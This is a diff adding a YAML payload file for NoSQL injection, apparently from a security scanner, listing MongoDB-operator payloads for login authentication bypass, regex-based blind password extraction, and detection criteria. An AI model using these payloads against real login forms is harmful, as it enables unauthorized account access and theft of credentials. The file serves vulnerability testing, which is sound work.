@@ -1,0 +1,36 @@
+id: nosqli
+name: NoSQL Injection
+severity_range: [high, critical]
+
+injection_points:
+  - login_forms
+  - json_body_parameters
+  - url_parameters
+
+payloads:
+  auth_bypass:
+    - 'username[$ne]=invalid&password[$ne]=invalid'
+    - 'login[$regex]=a.*&pass[$ne]=invalid'
+    - 'login[$gt]=admin&login[$lt]=test&pass[$ne]=1'
+    - '{"username": {"$ne": null}, "password": {"$ne": null}}'
+    - '{"username": {"$ne": ""}, "password": {"$ne": ""}}'
+    - '{"username": {"$gt": ""}, "password": {"$gt": ""}}'
+    - '{"username":{"$in":["Admin","admin","root","administrator"]},"password":{"$gt":""}}'
+
+  blind_extraction:
+    - '{"username": {"$eq": "admin"}, "password": {"$regex": "^a"}}'
+    - '{"username": {"$eq": "admin"}, "password": {"$regex": "^ab"}}'
+    - 'username[$ne]=toto&password[$regex]=.{1}'
+    - 'username[$ne]=toto&password[$regex]=.{3}'
+
+  operators:
+    - '{"$ne": 1}'
+    - '{"$gt": ""}'
+    - '{"$regex": ".*"}'
+    - '{"$nin": ["invalid"]}'
+    - '{"$exists": true}'
+
+detection:
+  auth_bypass: "successful login without valid credentials"
+  data_extraction: "response differs based on regex match"
+  error_based: "MongoDB/CouchDB error in response"
